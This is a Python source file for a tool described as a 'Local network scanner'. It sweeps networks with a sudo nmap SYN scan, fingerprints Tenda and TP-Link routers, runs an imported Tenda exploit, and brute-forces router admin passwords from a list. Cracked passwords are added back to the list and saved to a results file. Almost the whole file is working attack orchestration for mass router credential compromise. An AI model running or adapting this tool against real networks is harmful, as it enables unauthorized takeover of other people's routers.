import argparse
import re
import subprocess
import xml.etree.ElementTree as ET
import requests
import tp_link
import tenda

colors = {
    'Color_Off': "\033[0m",
    'Black': "\033[0;30m",
    'Red': "\033[0;31m",
    'Green': "\033[0;32m",
    'Yellow': "\033[0;33m",
    'Blue': "\033[0;34m",
    'Purple': "\033[0;35m",
    'Cyan': "\033[0;36m",
    'White': "\033[0;37m"
}


class PasswordSource:
    def __init__(self, manual_passwords=None, password_file=None):
        self.passwords = []
        if password_file:
            self._load_from_file(password_file)
        elif manual_passwords:
            # preserve order, dedupe
            self.passwords = list(dict.fromkeys(manual_passwords))

    def _load_from_file(self, path):
        try:
            with open(path, "a+") as f:
                f.seek(0)
                self.passwords = [p.strip() for p in f if p.strip()]
            self.file_path = path
        except Exception:
            self.passwords = []
            self.file_path = None

    def add_new(self, passwd: str):
        if passwd and passwd not in self.passwords:
            self.passwords.append(passwd)
            if hasattr(self, "file_path") and self.file_path:
                with open(self.file_path, "a") as f:
                    f.write("\n" + passwd)


class DeviceResult:
    def __init__(self, ip_port: str, password: str | None, kind: str, success: bool):
        self.ip_port = ip_port
        self.password = password
        self.kind = kind
        self.success = success

    def format(self):
        if self.success:
            return f"{self.ip_port} - {self.password} | {self.kind}"
        return f"{self.ip_port} | {self.kind}"


class BaseHandler:
    def identify(self, ip_port: str) -> bool:
        raise NotImplementedError

    def exploit_or_bruteforce(self, ip_port: str, password_source: PasswordSource) -> DeviceResult:
        raise NotImplementedError


class TendaHandler(BaseHandler):
    KIND = "Tenda"

    def identify(self, ip_port: str) -> bool:
        return tenda.is_tenda(ip_port)

    def exploit_or_bruteforce(self, ip_port: str, password_source: PasswordSource) -> DeviceResult:
        print(
            f"{colors['Blue']}[*] {colors['Yellow']}Tenda found{colors['Color_Off']}")
        passwd = tenda.tenda_exploiter(ip_port)
        if not passwd:
            passwd = tenda.tenda_brute(ip_port, password_source.passwords)
        success = passwd is not None
        return DeviceResult(ip_port, passwd, self.KIND, success)


class TPLinkHandler(BaseHandler):
    KIND = "TP-Link"

    def identify(self, ip_port: str) -> bool:
        return tp_link.is_tplink(ip_port)

    def exploit_or_bruteforce(self, ip_port: str, password_source: PasswordSource) -> DeviceResult:
        print(
            f"{colors['Blue']}[*] {colors['Yellow']}TP-Link found{colors['Color_Off']}")
        passwd = tp_link.tp_bruter(ip_port, password_source.passwords)
        success = passwd is not None
        return DeviceResult(ip_port, passwd, self.KIND, success)


class FallbackHandler(BaseHandler):
    def identify(self, ip_port: str) -> bool:
        return True  # always last

    def exploit_or_bruteforce(self, ip_port: str, password_source: PasswordSource) -> DeviceResult:
        try:
            r = requests.get(f"http://{ip_port}/", timeout=5)
            MERCUSYS_RE = r"MW\S\S\S\S"
            match = re.search(MERCUSYS_RE, r.text)
            if match:
                return DeviceResult(ip_port, None, match.group(), False)
        except Exception:
            pass
        return DeviceResult(ip_port, None, "Unknown", False)


class NetworkScanner:
    def __init__(self, networks=None, input_file=None, ip_ports=[]):
        self.networks = networks
        self.input_file = input_file
        self.ip_ports = ip_ports
        
    def run_nmap(self):
        if not self.networks:
            return
        cmd = f"sudo nmap -sS -n -p 8080,80 {' '.join(self.networks)} --open -oX nmap.xml"
        subprocess.run(cmd.split(), check=False)

    def parse(self):
        if len(self.ip_ports) > 0:
            return
        try:
            tree = ET.parse(self.input_file if self.input_file else "nmap.xml")
            root = tree.getroot()
            for host in root.iter('host'):
                addr_tag = host.find('address')
                if addr_tag == None:
                    continue
                ip_addr = addr_tag.attrib.get('addr')
                for port in host.iter('port'):
                    portid = port.attrib.get('portid')
                    if ip_addr and portid:
                        self.ip_ports.append(f"{ip_addr}:{portid}")
        except Exception as e:
            print(f"Error parsing nmap XML: {e}")


class Orchestrator:
    def __init__(self, args):
        self.args = args
        self.password_source = PasswordSource(
            manual_passwords=args.passwords,
            password_file=args.password_file
        )
        self.scanner = NetworkScanner(
            networks=args.networks,
            input_file=args.input_file,
            ip_ports=args.ip_ports if args.ip_ports else []
        )
        self.handlers = [
            TendaHandler(),
            TPLinkHandler(),
            FallbackHandler(),
        ]
        self.results: list[DeviceResult] = []

    def execute(self):
        if self.args.networks:
            self.scanner.run_nmap()
        self.scanner.parse()
        for ip_port in self.scanner.ip_ports:
            self._process_ip(ip_port)

    def _process_ip(self, ip: str):
        for handler in self.handlers:
            try:
                if handler.identify(ip):
                    result = handler.exploit_or_bruteforce(
                        ip, self.password_source)
                    if result.password:
                        self.password_source.add_new(result.password)
                    self.results.append(result)
                    break
            except Exception:
                self.results.append(DeviceResult(
                    ip, None, "Unknown", False))
                break

    def persist(self, path = "results.txt"):
        try:
            with open(path, "w") as f:
                f.write("Success:\n")
                for r in self.results:
                    if r.success:
                        f.write(r.format() + "\n")
                f.write("\nFailed:\n")
                for r in self.results:
                    if not r.success:
                        f.write(r.format() + "\n")
        except Exception:
            pass


def build_parser():
    p = argparse.ArgumentParser(description='Local network scanner')
    g1 = p.add_mutually_exclusive_group(required=True)
    g2 = p.add_mutually_exclusive_group(required=True)
    g1.add_argument('-n', '--networks', nargs="*",
                    help='List of networks to scan')
    g1.add_argument('-f', '--input_file', help='Input file of nmap results')
    g1.add_argument('-i', '--ip_ports', nargs="*", help='List of IP:port to target')
    g2.add_argument('-p', '--passwords', nargs="*",
                    help='Manually add passwords to the list')
    g2.add_argument('-P', '--password_file', help='Add passwords from a file')
    p.add_argument('-o', '--output', help='Output file', default="results.txt")
    return p


def main():
    parser = build_parser()
    args = parser.parse_args()
    orchestrator = Orchestrator(args)
    orchestrator.execute()
    orchestrator.persist(args.output)


if __name__ == "__main__":
    main()
